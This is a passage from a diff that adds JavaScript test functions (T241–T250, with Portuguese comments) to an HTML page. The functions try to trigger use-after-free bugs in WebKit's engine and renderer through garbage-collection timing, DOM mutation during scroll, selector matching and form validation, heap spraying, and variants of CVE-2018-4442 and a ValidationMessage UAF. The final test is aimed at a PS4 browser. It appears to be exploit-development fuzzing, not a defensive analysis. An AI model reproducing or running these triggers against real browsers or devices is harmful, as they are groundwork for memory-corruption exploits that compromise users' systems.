+    if(!area) throw new Error('sem css-area');
+    area.style.display = 'block';
+
+    // Criar lista com contadores CSS
+    const style = document.createElement('style');
+    style.textContent = `
+      #css-area { counter-reset: section; }
+      #css-area div::before { counter-increment: section; content: counter(section) ". "; }
+      #css-area ol { list-style-type: upper-roman; }
+      #css-area .counted::before { content: counters(section, ".") " "; }
+    `;
+    document.head.appendChild(style);
+
+    // Criar estrutura com contadores
+    const counted = [];
+    for(let i = 0; i < 50; i++){
+      const el = document.createElement('div');
+      el.className = 'counted';
+      el.textContent = 'item ' + i;
+      area.appendChild(el);
+      counted.push(el);
+    }
+
+    // Forcar layout — cria RenderObjects com contadores
+    let _ = area.offsetHeight;
+    let _2 = window.getComputedStyle(counted[0], '::before').content;
+
+    // Mutar DOM enquanto render tree tem contadores pendentes
+    for(let i = 0; i < 20; i++){
+      try {
+        // Remover elemento do meio — invalida contadores dos subsequentes
+        const el = counted[i % counted.length];
+        if(el.parentNode) area.removeChild(el);
+        gc(); // GC: RenderObjects com contadores podem ser liberados
+        // Re-inserir em posicao diferente
+        area.insertBefore(el, area.firstChild);
+        _ = area.offsetHeight; // forcar recalculo de contadores
+      } catch(e){}
+    }
+
+    // Adicionar/remover estilos que afetam os contadores
+    for(let i = 0; i < 10; i++){
+      try {
+        style.textContent = '#css-area { counter-reset: section ' + i + '; }';
+        gc();
+        _ = area.offsetHeight;
+      } catch(e){}
+    }
+
+    // Limpar
+    area.style.display = 'none';
+    try { document.head.removeChild(style); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 241: fim');
+}
+
+// T242 — Proxy ownKeys + for-in + GC (JSPropertyNameEnumerator C++ UAF)
+// for-in usa JSPropertyNameEnumerator que armazena lista de propriedades;
+// Proxy cujo ownKeys retorna lista com GC pode corromper o enumerador.
+function t242(){
+  log('Teste 242: inicio');
+  try {
+    let keyData = new Array(100).fill(0).map(function(_, i){ return 'key_' + i; });
+
+    const target = {};
+    for(let k of keyData) target[k] = k.toUpperCase();
+
+    let enumStep = 0;
+    const p = new Proxy(target, {
+      ownKeys: function(t){
+        enumStep++;
+        if(enumStep % 5 === 0){
+          keyData = null; // soltar referencia
+          gc();           // GC: lista de chaves no enumerador pode ser liberada
+          keyData = new Array(100).fill(0).map(function(_, i){ return 'key_' + i; });
+        }
+        return Object.keys(t);
+      },
+      getOwnPropertyDescriptor: function(t, k){
+        return { value: t[k], writable: true, enumerable: true, configurable: true };
+      }
+    });
+
+    // for-in no proxy com GC no ownKeys
+    for(let i = 0; i < 30; i++){
+      try {
+        let result = [];
+        for(let k in p){ result.push(k); if(result.length > 200) break; }
+      } catch(e){}
+    }
+
+    // Object.keys/values/entries em Proxy com GC
+    for(let i = 0; i < 20; i++){
+      try { Object.keys(p); }    catch(e){}
+      try { Object.values(p); }  catch(e){}
+      try { Object.entries(p); } catch(e){}
+      gc();
+    }
+
+    // JSON.stringify de Proxy com ownKeys que faz GC
+    let jsonStep = 0;
+    const jsonProxy = new Proxy({ a: 1, b: 2, c: 3 }, {
+      ownKeys: function(t){
+        jsonStep++;
+        if(jsonStep % 3 === 0) gc();
+        return ['a', 'b', 'c'];
+      },
+      get: function(t, k){ gc(); return t[k]; }
+    });
+    for(let i = 0; i < 20; i++){
+      try { JSON.stringify(jsonProxy); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 242: fim');
+}
+
+// T243 — Error.stack stack overflow + GC (LLInt stack walker)
+// Error.stack captura o stack trace em C++ percorrendo os frames LLInt;
+// funcao muito recursiva + Error.stack pode causar stack overflow no walker C++.
+function t243(){
+  log('Teste 243: inicio');
+  try {
+    // Recursao profunda com capture de stack em cada nivel
+    function deepWithStack(n){
+      if(n <= 0){
+        let e = new Error('deep_stack_' + n);
+        let s = e.stack; // captura stack trace — percorre todos os frames LLInt
+        gc();
+        return s ? s.length : 0;
+      }
+      return deepWithStack(n - 1) + 1;
+    }
+    // Tentar profundidades crescentes
+    for(let depth of [100, 500, 1000, 2000, 5000, 10000]){
+      try { deepWithStack(depth); } catch(e){}
+    }
+
+    // Error com causa aninhada profunda (ES2022 Error cause)
+    function makeNestedError(depth){
+      if(depth <= 0) return new Error('root');
+      return new Error('level_' + depth, { cause: makeNestedError(depth - 1) });
+    }
+    try {
+      const deep = makeNestedError(1000);
+      gc();
+      // Percorrer a cadeia de causas
+      let e = deep;
+      while(e && e.cause){ e = e.cause; }
+    } catch(e){}
+
+    // Error.stack em funcao anonima aninhada
+    function outer(){
+      return (function middle(){
+        return (function inner(){
+          return new Error('triple').stack;
+        })();
+      })();
+    }
+    for(let i = 0; i < 100; i++){
+      try { outer(); gc(); } catch(e){}
+    }
+
+    // prepareStackTrace customizado que faz GC
+    const origPST = Error.prepareStackTrace;
+    Error.prepareStackTrace = function(err, frames){
+      gc(); // GC durante preparacao do stack trace
+      return frames.map(function(f){ return f.toString(); }).join('\n');
+    };
+    for(let i = 0; i < 50; i++){
+      try { new Error('custom_' + i).stack; } catch(e){}
+    }
+    Error.prepareStackTrace = origPST;
+  } catch(e){}
+  log('Teste 243: fim');
+}
+
+// T244 — WebCore: scroll + layout + GC (ScrollingCoordinator UAF)
+// Eventos de scroll disparam updateLayout; se o DOM e mutado durante o scroll event,
+// o ScrollingCoordinator pode ter ponteiros dangling.
+function t244(){
+  log('Teste 244: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+    area.style.display = 'block';
+    area.style.overflow = 'auto';
+    area.style.height = '100px';
+
+    // Criar conteudo grande para habilitar scroll
+    const scrollContent = document.createElement('div');
+    scrollContent.style.height = '10000px';
+    for(let i = 0; i < 100; i++){
+      const child = document.createElement('div');
+      child.style.height = '100px';
+      child.textContent = 'scroll_item_' + i;
+      scrollContent.appendChild(child);
+    }
+    area.appendChild(scrollContent);
+
+    const childNodes = Array.from(scrollContent.children);
+
+    // Handler de scroll que muta o DOM
+    let scrollCount = 0;
+    function scrollMutator(){
+      scrollCount++;
+      try {
+        // Remover filho durante scroll — RenderObject com scroll info pode ser UAF
+        const idx = scrollCount % childNodes.length;
+        if(childNodes[idx].parentNode){
+          scrollContent.removeChild(childNodes[idx]);
+          gc();
+          scrollContent.appendChild(childNodes[idx]);
+        }
+      } catch(e){}
+    }
+    area.addEventListener('scroll', scrollMutator);
+
+    // Disparar scroll
+    for(let pos of [100, 500, 1000, 5000, 9900, 0]){
+      try {
+        area.scrollTop = pos;
+        gc();
+      } catch(e){}
+    }
+
+    // scrollIntoView de elemento que e removido durante o scroll
+    for(let child of childNodes.slice(0, 10)){
+      try {
+        child.scrollIntoView({ behavior: 'instant', block: 'center' });
+        if(child.parentNode){ scrollContent.removeChild(child); gc(); scrollContent.appendChild(child); }
+      } catch(e){}
+    }
+
+    area.removeEventListener('scroll', scrollMutator);
+    area.style.display = 'none';
+    area.style.overflow = '';
+    area.style.height = '';
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 244: fim');
+}
+
+// T245 — Function.prototype.bind chain + butterfly sparse + GC (CVE-2018-4442 variant)
+// bind cria JSBoundFunction com m_boundArgs; m_boundArgs e alocado no GC heap;
+// tornar m_boundArgs sparse (com buracos) e chamar a funcao bound pode triggerar UAF.
+function t245(){
+  log('Teste 245: inicio');
+  try {
+    function target(...args){ return args.reduce(function(s,v){ return s+(v||0); }, 0); }
+
+    // Criar bound functions com m_boundArgs grande e sparse
+    const boundFns = [];
+    for(let i = 0; i < 100; i++){
+      const args = new Array(50);
+      args[0]  = i * 1.1;
+      args[25] = i * 2.2;  // buraco do indice 1 ao 24
+      args[49] = i * 3.3;  // buraco do 26 ao 48
+      boundFns.push(target.bind(null, ...args));
+    }
+
+    gc(); // GC com m_boundArgs sparse no heap
+
+    // Chamar bound functions pos-GC
+    for(let fn of boundFns){
+      try { fn(99); } catch(e){}
+    }
+
+    // Liberar bound functions e tentar reusar os slots com novos objetos
+    boundFns.length = 0;
+    gc();
+
+    // Reusar com ArrayBufferViews (mesma area de alocacao do GC heap)
+    const views = [];
+    for(let i = 0; i < 200; i++){
+      views.push(new Float64Array(50));
+    }
+
+    // Criar novas bound functions — podem reusar slots de m_boundArgs liberados
+    for(let i = 0; i < 100; i++){
+      const fn = target.bind(null, ...views[i % 200]);
+      try { fn(); } catch(e){}
+    }
+
+    // Variante: bind de funcao nativa com args que tem getters com GC
+    const argsWithGetter = [];
+    for(let i = 0; i < 10; i++){
+      const obj = {};
+      Object.defineProperty(obj, 'valueOf', {
+        get: function(){ gc(); return function(){ return i; }; }
+      });
+      argsWithGetter.push(obj);
+    }
+    const boundNative = Array.prototype.push.bind([], ...argsWithGetter);
+    try { boundNative(); } catch(e){}
+  } catch(e){}
+  log('Teste 245: fim');
+}
+
+// T246 — WTF::StringImpl UAF: string compartilhada liberada + acesso via substring
+// StringImpl usa refcounting; substring compartilha o mesmo StringImpl com offset;
+// se a string original e liberada e o StringImpl atinge refcount 0, a substring tem UAF.
+function t246(){
+  log('Teste 246: inicio');
+  try {
+    // Criar StringImpl grande que sera compartilhada
+    let bigStr = 'x'.repeat(100000) + 'MARKER' + 'y'.repeat(100000);
+    let bigStrRef = bigStr;
+
+    // Criar substrings que compartilham o mesmo StringImpl
+    const subs = [];
+    subs.push(bigStr.substring(0, 50000));
+    subs.push(bigStr.substring(50000, 100006)); // inclui MARKER
+    subs.push(bigStr.slice(100006));
+    subs.push(bigStr.slice(99998, 100010));      // ao redor do MARKER
+
+    // Soltar referencia a string original — StringImpl pode ser liberado
+    bigStr = null;
+    gc();
+    gcHeavy();
+
+    // Acessar substrings pos-GC — StringImpl pode ter sido liberado
+    for(let sub of subs){
+      try { let l = sub.length; }                      catch(e){}
+      try { sub.indexOf('MARKER'); }                   catch(e){}
+      try { sub.toUpperCase(); }                       catch(e){}
+      try { sub.split(''); }                           catch(e){}
+      try { sub.charCodeAt(sub.length / 2); }         catch(e){}
+      try { sub.normalize('NFC'); }                    catch(e){}
+      try { JSON.stringify(sub); }                     catch(e){}
+    }
+
+    // Criar novas strings que podem reutilizar o espaco do StringImpl liberado
+    const newStrs = [];
+    for(let i = 0; i < 1000; i++){
+      newStrs.push(new Uint8Array(100).fill(65 + (i % 26)));
+    }
+
+    // Tentar usar substrings novamente apos reutilizacao do espaco
+    for(let sub of subs){
+      try { sub.length; } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 246: fim');
+}
+
+// T247 — Array.prototype.filter + map + GC encadeados (C++ nativo)
+// filter e map alocam novo array em C++; GC entre operacoes pode liberar arrays intermediarios.
+function t247(){
+  log('Teste 247: inicio');
+  try {
+    let src = new Array(1000).fill(0).map(function(_, i){
+      return { id: i, val: Math.random(), buf: new Uint8Array(16) };
+    });
+    let srcRef = src;
+
+    let filterN = 0;
+    // filter + map com GC nos callbacks
+    try {
+      const result = src
+        .filter(function(item){
+          filterN++;
+          if(filterN === 200){ src = null; gc(); src = srcRef; }
+          return item.val > 0.5;
+        })
+        .map(function(item){
+          gc();
+          return { doubled: item.id * 2, bufLen: item.buf.length };
+        })
+        .reduce(function(acc, item){
+          gc();
+          return acc + item.doubled;
+        }, 0);
+    } catch(e){}
+
+    // find/findIndex com GC
+    let findN = 0;
+    try {
+      srcRef.find(function(item){
+        findN++;
+        if(findN === 300) gc();
+        return item.id === 999;
+      });
+    } catch(e){}
+
+    // every/some com GC
+    try {
+      srcRef.every(function(item){
+        if(item.id === 500) gc();
+        return item.val >= 0;
+      });
+    } catch(e){}
+    try {
+      srcRef.some(function(item){
+        if(item.id === 500) gc();
+        return item.val > 0.9999;
+      });
+    } catch(e){}
+
+    // forEach com GC que muta o array
+    let forEachN = 0;
+    try {
+      srcRef.slice(0, 100).forEach(function(item, idx, arr){
+        forEachN++;
+        if(forEachN === 30){ arr.length = 50; gc(); }
+        item.val = item.val * 2;
+      });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 247: fim');
+}
+
+// T248 — CSS Selectors complexos + querySelectorAll + DOM mutation + GC
+// querySelectorAll usa o engine de CSS selectors em C++ (SelectorChecker);
+// DOM mutation durante o matching pode causar UAF no SelectorChecker.
+function t248(){
+  log('Teste 248: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    if(!area) throw new Error('sem dom10');
+    area.style.display = 'block';
+
+    // Criar arvore DOM complexa para o matching
+    for(let i = 0; i < 20; i++){
+      const div = document.createElement('div');
+      div.className = 'level-1 item-' + i;
+      div.setAttribute('data-index', i);
+      for(let j = 0; j < 5; j++){
+        const span = document.createElement('span');
+        span.className = 'level-2 sub-' + j;
+        const p = document.createElement('p');
+        p.className = 'level-3';
+        p.textContent = 'content_' + i + '_' + j;
+        span.appendChild(p);
+        div.appendChild(span);
+      }
+      area.appendChild(div);
+    }
+
+    // Selectores complexos que stressam o SelectorChecker
+    const selectors = [
+      '.level-1 > .level-2 ~ .level-2 + .level-2',
+      '.level-1:nth-child(odd) .level-3:first-child',
+      '.level-1:not(:last-child) > .level-2:nth-of-type(2n+1)',
+      ':is(.level-1, .level-2, .level-3):not(:empty)',
+      '.level-1:has(> .level-2 > .level-3)',
+      '[data-index]:not([data-index="0"]):not([data-index="1"])',
+      '.item-0 ~ .item-2 ~ .item-4 ~ .item-6',
+    ];
+
+    for(let sel of selectors){
+      try {
+        const results = area.querySelectorAll(sel);
+        gc(); // GC apos querySelectorAll
+        // Remover os elementos encontrados durante o uso dos resultados
+        for(let el of results){
+          if(el.parentNode) el.parentNode.removeChild(el);
+        }
+        gc(); // GC: results tem dangling NodeList pointers
+        // Tentar acessar os resultados removidos
+        for(let el of results){
+          try { el.textContent; } catch(e){}
+        }
+      } catch(e){}
+    }
+
+    area.style.display = 'none';
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+  } catch(e){}
+  log('Teste 248: fim');
+}
+
+// T249 — Intl.DateTimeFormat/NumberFormat + GC durante formatacao (ICU UAF)
+// Intl usa ICU em C++; objetos Intl tem buffers ICU alocados em fastMalloc;
+// GC durante a formatacao pode liberar o objeto Intl mas ICU ainda usa o buffer.
+function t249(){
+  log('Teste 249: inicio');
+  try {
+    // Criar formatadores Intl
+    let dtf = new Intl.DateTimeFormat('pt-BR', {
+      year: 'numeric', month: 'long', day: 'numeric',
+      hour: '2-digit', minute: '2-digit', second: '2-digit',
+      timeZone: 'America/Sao_Paulo'
+    });
+    let nf = new Intl.NumberFormat('pt-BR', {
+      style: 'currency', currency: 'BRL',
+      minimumFractionDigits: 2, maximumFractionDigits: 5
+    });
+
+    // Formatar com GC entre chamadas
+    const dates = [
+      new Date(0),
+      new Date('2024-01-01'),
+      new Date(NaN),
+      new Date(8640000000000000),   // data maxima
+      new Date(-8640000000000000),  // data minima
+      new Date(2147483647000),       // Unix timestamp max (int32)
+    ];
+
+    for(let d of dates){
+      try {
+        let result = dtf.format(d);
+        gc(); // GC apos format — objeto dtf pode ser coletado
+        result.length;
+      } catch(e){}
+    }
+
+    // Soltar referencia ao formatador durante uso
+    let dtfRef = dtf;
+    let formatStep = 0;
+
+    function formatWithGC(d){
+      formatStep++;
+      let result = dtfRef.format(d);
+      if(formatStep === 5){ dtf = null; gc(); dtf = dtfRef; } // GC no meio
+      return result;
+    }
+
+    for(let d of dates){
+      try { formatWithGC(d); } catch(e){}
+    }
+
+    // NumberFormat com valores extremos
+    const extremeNums = [
+      Infinity, -Infinity, NaN, -0, 0,
+      Number.MAX_VALUE, Number.MIN_VALUE,
+      Number.EPSILON, Number.MAX_SAFE_INTEGER,
+      1e308, -1e308, 1e-308
+    ];
+
+    for(let n of extremeNums){
+      try {
+        let r = nf.format(n);
+        gc();
+        r.length;
+      } catch(e){}
+    }
+
+    // Intl.Collator com strings malformadas
+    try {
+      const col = new Intl.Collator('pt-BR', { sensitivity: 'accent', usage: 'sort' });
+      const strs = ['\uD800', '\uDFFF', '\u0000', 'a', 'z', '\uFFFF'];
+      strs.sort(function(a, b){ gc(); return col.compare(a, b); });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 249: fim');
+}
+
+// T250 — STRESS FINAL: ValidationMessage + CVE-2018-4442 + IsoHeap + querySelectorAll
+// Combinacao dos quatro vetores mais especificos para PS4 no-JIT
+// em sequencia rapida com GC pesado entre cada fase
+function t250(){
+  log('Teste 250: inicio');
+  try {
+    const area = document.getElementById('dom10');
+    area.style.display = 'block';
+
+    // === FASE 1: ValidationMessage UAF (Synacktiv technique) ===
+    try {
+      const form = document.createElement('form');
+      const inp = document.createElement('input');
+      inp.type = 'email';
+      inp.value = 'INVALID EMAIL NO AT SIGN';
+      form.appendChild(inp);
+      document.body.appendChild(form);
+
+      function destroyDuringBuild(){
+        try {
+          form.removeChild(inp);
+          gcHeavy();
+          form.appendChild(inp);
+        } catch(e){}
+      }
+      inp.addEventListener('invalid', destroyDuringBuild);
+      inp.addEventListener('focus', destroyDuringBuild);
+      for(let i = 0; i < 10; i++){
+        try { inp.checkValidity(); }  catch(e){}
+        try { inp.reportValidity(); } catch(e){}
+        try { inp.focus(); }          catch(e){}
+        gc();
+      }
+      inp.removeEventListener('invalid', destroyDuringBuild);
+      inp.removeEventListener('focus', destroyDuringBuild);
+      try { document.body.removeChild(form); } catch(e){}
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 2: butterfly UAF (CVE-2018-4442 pattern) ===
+    try {
+      function makeButterfly(n){ const o={}; for(let i=0;i<n;i++) o['p'+i]=i*1.1; return o; }
+      const victims = new Array(100).fill(0).map(function(){ return makeButterfly(30); });
+      victims.length = 0;
+      gc();
+      // Reclamar com bind chains
+      function tgt(...a){ return a.length; }
+      const fns = [];
+      for(let i = 0; i < 200; i++) fns.push(tgt.bind(null, ...new Array(30).fill(i*0.1)));
+      for(let fn of fns) try { fn(); } catch(e){}
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 3: IsoHeap spray + DOM removal ===
+    try {
+      const inputs = [];
+      for(let i = 0; i < 300; i++){
+        const inp = document.createElement('input');
+        inp.type = ['number','text','email','password','search'][i%5];
+        area.appendChild(inp);
+        inputs.push(inp);
+      }
+      gc();
+      for(let i = 0; i < 150; i++) try { area.removeChild(inputs[i]); } catch(e){}
+      gc();
+      // Reusar com views
+      const views = new Array(150).fill(0).map(function(){ return new Uint32Array(new ArrayBuffer(256)); });
+      for(let i = 150; i < 300; i++){
+        try {
+          if(inputs[i].parentNode){
+            let t = inputs[i].type;
+            inputs[i].value = 'spray_test';
+          }
+        } catch(e){}
+      }
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 4: querySelectorAll + DOM mutation + GC ===
+    try {
+      for(let i = 0; i < 20; i++){
+        const div = document.createElement('div');
+        div.className = 'stress-item stress-' + (i%3);
+        div.setAttribute('data-n', i);
+        area.appendChild(div);
+      }
+      for(let sel of ['.stress-item', '.stress-0 ~ .stress-1', '[data-n]:not([data-n="0"])']){
+        try {
+          const found = area.querySelectorAll(sel);
+          for(let el of found) if(el.parentNode) el.parentNode.removeChild(el);
+          gc();
+          for(let el of found) try { el.className; } catch(e){}
+        } catch(e){}
+      }
+    } catch(e){}
+
+    area.style.display = 'none';
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    gcHeavy();
+  } catch(e){}
+  log('Teste 250: fim');
+}
+</script>
+</body>
+</html>
